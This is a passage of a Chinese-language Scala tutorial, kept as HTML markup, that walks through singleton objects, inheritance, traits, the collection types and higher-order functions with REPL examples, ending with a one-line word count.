p3.age</span><br><span class=\"line\">&lt;console&gt;:13: error: value age is not a member of Person</span><br><span class=\"line\">       p3.age</span><br><span class=\"line\">          ^</span><br></pre></td></tr></table></figure><br><code>var</code>和<code>val</code>都可以在主构造器中快速初始化成员变量，因为类的成员变量必须是确定的，所以只有在主构造器中参数列表允许使用这两个关键字。这种写法等价于Java中的<code>this.firstName = firstName</code></p>\n<p>对于访问修饰符：<strong>Scala中，如果没有指定任何的修饰符，则默认为 public。这样的成员在任何地方都可以被访问。</strong>,private和protect的使用和Jave类似。</p>\n<h3 id=\"扩展类object\"><a href=\"#扩展类object\" class=\"headerlink\" title=\"扩展类object\"></a>扩展类object</h3><p>在Java中，有一种方发成为静态方法或者类方法，使用<code>static</code>关键字修饰。Scala没有采用这种类方法定义的策略，Scala中在class里定义的全是实例方法。当有的类只能拥有一个实例时，Scala可以将其定义为Object：<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">object</span> <span class=\"title\">PrinterService</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">print</span></span>() &#123;</span><br><span class=\"line\">    println(<span class=\"string\">&quot;I am printing...&quot;</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>执行后效果如下:<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"type\">PrinterService</span>.print()</span><br><span class=\"line\"><span class=\"type\">I</span> am printing...</span><br></pre></td></tr></table></figure><br>Object类似Java设计模式中的单例（Singleton），且object和class可以有相同的名字，如果一个class需要定义类方法，可以吧类方法定义在同名的object中，这种策略叫做伙伴对象（companion objects）</p>\n<h3 id=\"继承\"><a href=\"#继承\" class=\"headerlink\" title=\"继承\"></a>继承</h3><p>作为面向对象的三大特性之一：继承，在scala中的表现形式略不同于Java，我们先举个例子：一个Person类，Employee类是他的派生<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span>(<span class=\"params\">val name:<span class=\"type\">String</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">talk</span></span>(message:<span class=\"type\">String</span>) = println(name + <span class=\"string\">&quot; says &#x27;&quot;</span> + message + <span class=\"string\">&quot;&#x27;&quot;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Employee</span>(<span class=\"params\">override val name:<span class=\"type\">String</span>, val number:<span class=\"type\">Int</span></span>) <span class=\"keyword\">extends</span> <span class=\"title\">Person</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">override</span> <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">talk</span></span>(message:<span class=\"type\">String</span>) = println(name + <span class=\"string\">&quot; with number &quot;</span> + number + <span class=\"string\">&quot; says &#x27;&quot;</span> + message + <span class=\"string\">&quot;&#x27;&quot;</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>Employee扩展了Person类，增加了<code>number</code>字段，并重载了<code>talk</code>方法，一切对于父类的派生扩展，都需要用到<code>override</code>关键字，Scala这个规定是为了防止你无意中引入错误的方法。<br>实例化，输出：<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> person = <span class=\"keyword\">new</span> <span class=\"type\">Person</span>(<span class=\"string\">&quot;John&quot;</span>)</span><br><span class=\"line\">person: <span class=\"type\">Person</span> = <span class=\"type\">Person</span>@<span class=\"number\">2</span>f4ee7d8</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; person.talk(<span class=\"string\">&quot;I&#x27;m fine&quot;</span>)</span><br><span class=\"line\"><span class=\"type\">John</span> says &#x27;<span class=\"type\">I</span><span class=\"symbol\">&#x27;m</span> fine&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt;  <span class=\"keyword\">val</span> employee = <span class=\"keyword\">new</span> <span class=\"type\">Employee</span>(<span class=\"string\">&quot;aickson&quot;</span>,<span class=\"number\">114514</span>)</span><br><span class=\"line\">employee: <span class=\"type\">Employee</span> = <span class=\"type\">Employee</span>@<span class=\"number\">616</span>a108</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt;  employee.talk(<span class=\"string\">&quot;thank you sir&quot;</span>)</span><br><span class=\"line\">aickson <span class=\"keyword\">with</span> number <span class=\"number\">114514</span> says <span class=\"symbol\">&#x27;thank</span> you sir&#x27;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Trait\"><a href=\"#Trait\" class=\"headerlink\" title=\"Trait\"></a>Trait</h3><p>有时一个类有多个角色，在Java中使用Interface，C++使用多继承，Ruby使用mixins，Scala则使用了trait，你可以将它理解为Java的接口哇哦加一个接口的实现，或是看作是一个部分类（partial-class）。<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span>(<span class=\"params\">val name:<span class=\"type\">String</span></span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">trait</span> <span class=\"title\">Nice</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">greet</span></span>() = println(<span class=\"string\">&quot;Howdily doodily.&quot;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Character</span>(<span class=\"params\">override val name:<span class=\"type\">String</span></span>) <span class=\"keyword\">extends</span> <span class=\"title\">Person</span>(<span class=\"params\">name</span>) <span class=\"keyword\">with</span> <span class=\"title\">Nice</span></span></span><br></pre></td></tr></table></figure><br>上述代码，我们先定义了一个Person简单类，有定义了一个含有<code>greet</code>方法的trait Nice，最后定义一个新的类Character继承Person并带上Nice，此时Character就拥有了Nice中的<code>greet</code>行为：<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> p = <span class=\"keyword\">new</span> <span class=\"type\">Person</span>(<span class=\"string\">&quot;Bill&quot;</span>)</span><br><span class=\"line\">p: <span class=\"type\">Person</span> = <span class=\"type\">Person</span>@<span class=\"number\">28</span>ed9a7d</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; p.greet()</span><br><span class=\"line\">&lt;console&gt;:<span class=\"number\">13</span>: error: value greet is not a member of <span class=\"type\">Person</span></span><br><span class=\"line\">       p.greet()</span><br><span class=\"line\">         ^</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> c = <span class=\"keyword\">new</span> <span class=\"type\">Character</span>(<span class=\"string\">&quot;Bill&quot;</span>)</span><br><span class=\"line\">c: <span class=\"type\">Character</span> = <span class=\"type\">Character</span>@<span class=\"number\">18</span>cc52f5</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; c.greet()</span><br><span class=\"line\"><span class=\"type\">Howdily</span> doodily.</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"集合\"><a href=\"#集合\" class=\"headerlink\" title=\"集合\"></a>集合</h2><p>Scala的集合是这门语言学习的重点，因为Scala的一个重要特性是函数式编程，函数式编程由于其方便灵活的集合操作而闻名。Scala的集合主要包含表（List）集（Set）映射（map）</p>\n<h3 id=\"列表\"><a href=\"#列表\" class=\"headerlink\" title=\"列表\"></a>列表</h3><p>和大多函数式编程语言一样，最常用的数据结构是列表。List是事物的有序集合，可随机访问<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"type\">List</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>)</span><br><span class=\"line\">res3: <span class=\"type\">List</span>[<span class=\"type\">Int</span>] = <span class=\"type\">List</span>(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> l = <span class=\"type\">List</span>(<span class=\"string\">&quot;one&quot;</span>,<span class=\"string\">&quot;two&quot;</span>,<span class=\"string\">&quot;tree&quot;</span>)</span><br><span class=\"line\">l: <span class=\"type\">List</span>[<span class=\"type\">String</span>] = <span class=\"type\">List</span>(one, two, tree)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; l(<span class=\"number\">2</span>)</span><br><span class=\"line\">res0: <span class=\"type\">String</span> = tree</span><br></pre></td></tr></table></figure><br>Scala的泛型和静态类型推导使得我们可以如同脚本语言一样灵活的初始化一个列表，列表的随机访问需要用圆括号。List中的数据必须有相同的类型，如果类型不同，则List的成员类型是<code>Any</code>,这是Scala数据结构的公共父类，一个通用的数据类型。</p>\n<p>更多List方法：<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; l.length <span class=\"comment\">//长度</span></span><br><span class=\"line\">res18: <span class=\"type\">Int</span> = <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; l.isEmpty <span class=\"comment\">//判空</span></span><br><span class=\"line\">res19: <span class=\"type\">Boolean</span> = <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; l.head <span class=\"comment\">//头</span></span><br><span class=\"line\">res20: <span class=\"type\">String</span> = one</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; l.tail <span class=\"comment\">//尾</span></span><br><span class=\"line\">res21: <span class=\"type\">List</span>[<span class=\"type\">String</span>] = <span class=\"type\">List</span>(two, tree)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"type\">Nil</span>.isEmpty <span class=\"comment\">//Nil是一个空列表</span></span><br><span class=\"line\">res22: <span class=\"type\">Boolean</span> = <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; l.last <span class=\"comment\">//最后一个值</span></span><br><span class=\"line\">res23: <span class=\"type\">String</span> = tree</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; list.reverse <span class=\"comment\">//倒置</span></span><br><span class=\"line\">res25: <span class=\"type\">List</span>[<span class=\"type\">String</span>] = <span class=\"type\">List</span>(<span class=\"type\">Orange</span>, <span class=\"type\">Banana</span>, <span class=\"type\">Apple</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; list.drop(<span class=\"number\">1</span>) <span class=\"comment\">//删去指定下标，返回新List</span></span><br><span class=\"line\">res26: <span class=\"type\">List</span>[<span class=\"type\">String</span>] = <span class=\"type\">List</span>(<span class=\"type\">Banana</span>, <span class=\"type\">Orange</span>)</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"type\">List</span>(<span class=\"string\">&quot;hello&quot;</span>,<span class=\"string\">&quot;123&quot;</span>)</span><br><span class=\"line\">res2: <span class=\"type\">List</span>[<span class=\"type\">String</span>] = <span class=\"type\">List</span>(hello, <span class=\"number\">123</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"type\">List</span>(<span class=\"string\">&quot;hello&quot;</span>,<span class=\"number\">123</span>)</span><br><span class=\"line\">res3: <span class=\"type\">List</span>[<span class=\"type\">Any</span>] = <span class=\"type\">List</span>(hello, <span class=\"number\">123</span>)</span><br></pre></td></tr></table></figure>\n<p>我们来了解一下Scala中的类层次关系：<br><img src=\"1.png\" alt=\"\"><br>所有的Scala类型都继承自Any类，就像所有的Java对象类都继承自Object。Nothing类是所有类型的子类。譬如，对一个返回集合的函数来说，函数也可以返回 Nothing，这与给定函数的返回值类型相符。当你处理nil的概念时，这里有些细微的差别。Null是一个trait，null则是Null的一个实 例，与Java中的null类似，意思是一个空值。一个空集合是Nil，而Nothing是一个trait，是所 有类的子类。Nothing类没有实例，所以不能像Null那样对其解引用（dereference）。例如，抛出 异常的方法的返回值类型为Nothing，意思是根本没有返回值。 </p>\n<h3 id=\"集\"><a href=\"#集\" class=\"headerlink\" title=\"集\"></a>集</h3><p>Scala的Set使用方法和List类似，Set是一个无序集合，增删元素直接使用<code>+-</code>符号。<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> animals = <span class=\"type\">Set</span>(<span class=\"string\">&quot;lions&quot;</span>,<span class=\"string\">&quot;tigers&quot;</span>,<span class=\"string\">&quot;bears&quot;</span>)</span><br><span class=\"line\">animals: scala.collection.immutable.<span class=\"type\">Set</span>[<span class=\"type\">String</span>] = <span class=\"type\">Set</span>(lions, tigers, bears)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; animals - <span class=\"string\">&quot;trigers&quot;</span></span><br><span class=\"line\">res5: scala.collection.immutable.<span class=\"type\">Set</span>[<span class=\"type\">String</span>] = <span class=\"type\">Set</span>(lions, tigers, bears)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; animals + <span class=\"string\">&quot;pandas&quot;</span></span><br><span class=\"line\">res6: scala.collection.immutable.<span class=\"type\">Set</span>[<span class=\"type\">String</span>] = <span class=\"type\">Set</span>(lions, tigers, bears, pandas)</span><br></pre></td></tr></table></figure><br>Scala中Set使用<code>++</code>和<code>--</code>来进行集合的并和差操作。</p>\n<figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; animals ++ <span class=\"type\">Set</span>(<span class=\"string\">&quot;armadilos&quot;</span>, <span class=\"string\">&quot;raccons&quot;</span>)</span><br><span class=\"line\">res7: scala.collection.immutable.<span class=\"type\">Set</span>[<span class=\"type\">String</span>] = <span class=\"type\">Set</span>(bears, tigers, lions, armadilos, raccons)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; animals -- <span class=\"type\">Set</span>(<span class=\"string\">&quot;bears&quot;</span>, <span class=\"string\">&quot;lions&quot;</span>)</span><br><span class=\"line\">res8: scala.collection.immutable.<span class=\"type\">Set</span>[<span class=\"type\">String</span>] = <span class=\"type\">Set</span>(tigers)</span><br></pre></td></tr></table></figure>\n<p>注意：集的操作是无破坏新的，即增删改操作不会破坏原有的数据结构，而是创建一个副本，然后修改并返回。这体现了函数式编程的”无副作用“的思想。</p>\n<figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"type\">Set</span>(<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>) == <span class=\"type\">Set</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>)</span><br><span class=\"line\">res10: <span class=\"type\">Boolean</span> = <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"type\">List</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>) == <span class=\"type\">List</span>(<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">res11: <span class=\"type\">Boolean</span> = <span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n<p>集无序，列表有序。</p>\n<h3 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h3><p>Scala中的数组Array类似List，有着相同的构造和使用方式。<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> arr = <span class=\"type\">Array</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>)</span><br><span class=\"line\">arr: <span class=\"type\">Array</span>[<span class=\"type\">Int</span>] = <span class=\"type\">Array</span>(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; arr(<span class=\"number\">1</span>)</span><br><span class=\"line\">res49: <span class=\"type\">Int</span> = <span class=\"number\">2</span></span><br></pre></td></tr></table></figure><br>Scala中的List是不可变的递归数据（immutable recursive data）,是Scala中的一种基础结构，你应该多用List而不是Array</p>\n<h3 id=\"映射\"><a href=\"#映射\" class=\"headerlink\" title=\"映射\"></a>映射</h3><p>映射（Map）是一个键值对（Key-value）,和Java中的HashMap类似。<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> m = <span class=\"type\">Map</span>(<span class=\"number\">1</span> -&gt; <span class=\"string\">&quot;One&quot;</span>, <span class=\"number\">2</span> -&gt; <span class=\"string\">&quot;Two&quot;</span>, <span class=\"number\">3</span> -&gt; <span class=\"string\">&quot;Three&quot;</span>)</span><br><span class=\"line\">m: scala.collection.immutable.<span class=\"type\">Map</span>[<span class=\"type\">Int</span>,<span class=\"type\">String</span>] = <span class=\"type\">Map</span>(<span class=\"number\">1</span> -&gt; <span class=\"type\">One</span>, <span class=\"number\">2</span> -&gt; <span class=\"type\">Two</span>, <span class=\"number\">3</span> -&gt; <span class=\"type\">Three</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; m(<span class=\"number\">3</span>)</span><br><span class=\"line\">res12: <span class=\"type\">String</span> = <span class=\"type\">Three</span></span><br></pre></td></tr></table></figure><br>需要注意的是：Scala的函数式编程思想使得他默认数据类型都是不可变的，如果需要修改集合中的值，则需要使用特定的可变数据结构，这一点和默认数据结构可变的Java有较大差异。还是以Map为例，如果要可变：<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">import</span> scala.collection.mutable.<span class=\"type\">HashMap</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> scala.collection.mutable.<span class=\"type\">HashMap</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> newMap = <span class=\"keyword\">new</span> <span class=\"type\">HashMap</span>[<span class=\"type\">Int</span>,<span class=\"type\">String</span>]</span><br><span class=\"line\">newMap: scala.collection.mutable.<span class=\"type\">HashMap</span>[<span class=\"type\">Int</span>,<span class=\"type\">String</span>] = <span class=\"type\">Map</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; newMap += <span class=\"number\">4</span> -&gt; <span class=\"string\">&quot;four&quot;</span></span><br><span class=\"line\">res14: newMap.<span class=\"keyword\">type</span> = <span class=\"type\">Map</span>(<span class=\"number\">4</span> -&gt; four)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; newMap += <span class=\"number\">5</span> -&gt; <span class=\"string\">&quot;five&quot;</span></span><br><span class=\"line\">res15: newMap.<span class=\"keyword\">type</span> = <span class=\"type\">Map</span>(<span class=\"number\">5</span> -&gt; five, <span class=\"number\">4</span> -&gt; four)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"高阶函数\"><a href=\"#高阶函数\" class=\"headerlink\" title=\"高阶函数\"></a>高阶函数</h3><p>通俗地说，高阶函数就是一个生成或使用函数的函数。更具体点说，高阶函数是一个以其他函数作为输入参数或以函数作为返回结果的函数。这种使用其他函数来构造函数的方法是函数式编程语言家族中的关键概念，并且它还会影响使用其他语言编写代码的方式。 </p>\n<ol>\n<li><p>foreach<br><code>foreach</code>方法接受一个代码块作为参数。在Scala中，你可以用<code>variableName =&gt; yourCode这</code>样 形式来表示代码块： </p>\n<figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> list = <span class=\"type\">List</span>(<span class=\"string\">&quot;Apple&quot;</span>,<span class=\"string\">&quot;Banana&quot;</span>,<span class=\"string\">&quot;Orange&quot;</span>)</span><br><span class=\"line\">list: <span class=\"type\">List</span>[<span class=\"type\">String</span>] = <span class=\"type\">List</span>(<span class=\"type\">Apple</span>, <span class=\"type\">Banana</span>, <span class=\"type\">Orange</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; list.foreach(fruit =&gt; println(<span class=\"string\">&quot;I like &quot;</span> + fruit))</span><br><span class=\"line\"><span class=\"type\">I</span> like <span class=\"type\">Apple</span></span><br><span class=\"line\"><span class=\"type\">I</span> like <span class=\"type\">Banana</span></span><br><span class=\"line\"><span class=\"type\">I</span> like <span class=\"type\">Orange</span></span><br></pre></td></tr></table></figure>\n<p>其中<code>fruit =&gt; println(&quot;I like &quot; + fruit)</code>就是一个匿名函数，<code>foreach</code>接受一个匿名函数，并遍历集合内的所有值，对其执行该函数。</p>\n</li>\n<li><p>count/filter/forall/exists</p>\n<figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"type\">List</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>).count(x =&gt; x &gt; <span class=\"number\">3</span>)</span><br><span class=\"line\">res27: <span class=\"type\">Int</span> = <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"type\">List</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>).filter(x =&gt; x &gt; <span class=\"number\">3</span>)</span><br><span class=\"line\">res28: <span class=\"type\">List</span>[<span class=\"type\">Int</span>] = <span class=\"type\">List</span>(<span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"type\">List</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>).forall(x =&gt; x &lt; <span class=\"number\">9</span>)</span><br><span class=\"line\">res30: <span class=\"type\">Boolean</span> = <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"type\">List</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>).exists(x =&gt; x &gt; <span class=\"number\">9</span>)</span><br><span class=\"line\">res32: <span class=\"type\">Boolean</span> = <span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n<p><code>count</code>用于计算满足条件的元素的个数，返回整数，<code>filter</code>用于过滤出满足条件的元素，如果代码块对于集合中的所有元素都返回true的话，那么<code>forall</code>返回true，如果代码块仅对集合中的某一个元素返回true，那么<code>exists</code>方法返回true</p>\n</li>\n<li><p>map</p>\n<figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"type\">List</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>).map(x =&gt; x + <span class=\"number\">1</span>)</span><br><span class=\"line\">res36: <span class=\"type\">List</span>[<span class=\"type\">Int</span>] = <span class=\"type\">List</span>(<span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>)</span><br></pre></td></tr></table></figure>\n<p><code>map</code>和<code>foreach</code>类似，将匿名函数应用于每个元素上，但<code>map</code>返回模式下映射的新集合</p>\n</li>\n<li><p>sort</p>\n<figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"type\">List</span>(<span class=\"number\">2</span>,<span class=\"number\">7</span>,<span class=\"number\">9</span>,<span class=\"number\">4</span>,<span class=\"number\">7</span>,<span class=\"number\">9</span>,<span class=\"number\">2</span>,<span class=\"number\">4</span>,<span class=\"number\">6</span>,<span class=\"number\">1</span>,<span class=\"number\">9</span>).sorted</span><br><span class=\"line\">res2: <span class=\"type\">List</span>[<span class=\"type\">Int</span>] = <span class=\"type\">List</span>(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">9</span>, <span class=\"number\">9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"type\">List</span>(<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>,<span class=\"number\">1</span>,<span class=\"number\">9</span>,<span class=\"number\">6</span>,<span class=\"number\">8</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">9</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>).sortWith((x, y) =&gt; x &gt; y)</span><br><span class=\"line\">res34: <span class=\"type\">List</span>[<span class=\"type\">Int</span>] = <span class=\"type\">List</span>(<span class=\"number\">9</span>, <span class=\"number\">9</span>, <span class=\"number\">8</span>, <span class=\"number\">7</span>, <span class=\"number\">6</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>, <span class=\"number\">4</span>, <span class=\"number\">3</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"type\">List</span>(<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>,<span class=\"number\">1</span>,<span class=\"number\">9</span>,<span class=\"number\">6</span>,<span class=\"number\">8</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">9</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>).sortWith((x, y) =&gt; x &gt; y)</span><br><span class=\"line\">res35: <span class=\"type\">List</span>[<span class=\"type\">Int</span>] = <span class=\"type\">List</span>(<span class=\"number\">9</span>, <span class=\"number\">9</span>, <span class=\"number\">8</span>, <span class=\"number\">7</span>, <span class=\"number\">6</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>, <span class=\"number\">4</span>, <span class=\"number\">3</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n<p><code>sortWith</code>可以自定义一个排序规则并返回排序结果</p>\n</li>\n</ol>\n<p>Scala的高阶算子还有很多，具体参考文档。以上算子可以轻易的实现单词计数，例如统计这句话中的单词的个数：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">can you can a can like a canner can a can</span><br></pre></td></tr></table></figure><br>scala的实现仅仅需要一行<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"string\">&quot;can you can a can like a canner can a can&quot;</span>.split(<span class=\"string\">&quot; &quot;</span>).map(x=&gt;(x,<span class=\"number\">1</span>)).groupBy(x=&gt;x._1).map(x=&gt;(x._1,x._2.length))</span><br><span class=\"line\">res48: scala.collection.immutable.<span class=\"type\">Map</span>[<span class=\"type\">String</span>,<span class=\"type\">Int</span>] = <span class=\"type\">Map</span>(a -&gt; <span class=\"number\">3</span>, you -&gt; <span class=\"number\">1</span>, can -&gt; <span class=\"number\">5</span>, canner -&gt; <span class=\"number\">1</span>, like -&gt; <span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure><br>如果活用其语法糖技巧，还可以更加简短，这就是函数式编程的魅力！<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"string\">&quot;can you can a can like a canner can a can&quot;</span>.split(<span class=\"string\">&quot; &quot;</span>).map((_,<span class=\"number\">1</span>)).groupBy(_._1).map(x=&gt;(x._1,x._2.length))</span><br><span class=\"line\">res48: scala.collection.immutable.<span class=\"type\">Map</span>[<span class=\"type\">String</span>,<span class=\"type\">Int</span>] = <span class=\"type\">Map</span>(a -&gt; <span class=\"number\">3</span>, you -&gt; <span class=\"number\">1</span>, can -&gt; <span class=\"number\">5</span>, canner -&gt; <span class=\"number\">1</span>, like -&gt; <span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure></p>\n<ol>\n<li>foldLeft<br>cala中的foldLeft方法与Ruby中的inject方法非常相似。你只需提供一个初始值以及一个 代码块，foldLeft就会将数组中的每个元素和另外的一个值传递给代码块。<figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> list = <span class=\"type\">List</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>)</span><br><span class=\"line\">list: <span class=\"type\">List</span>[<span class=\"type\">Int</span>] = <span class=\"type\">List</span>(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> sum = (<span class=\"number\">0</span> /: list) &#123;(sum, i) =&gt; sum + i&#125;</span><br><span class=\"line\">sum: <span class=\"type\">Int</span> = <span class=\"number\">6</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"XML\"><a href=\"#XML\" class=\"headerlink\" title=\"XML\"></a>XML</h2><p>在解决现代编程问题的过程中我们越来越多地用到了XML（Extensible Markup Language，可 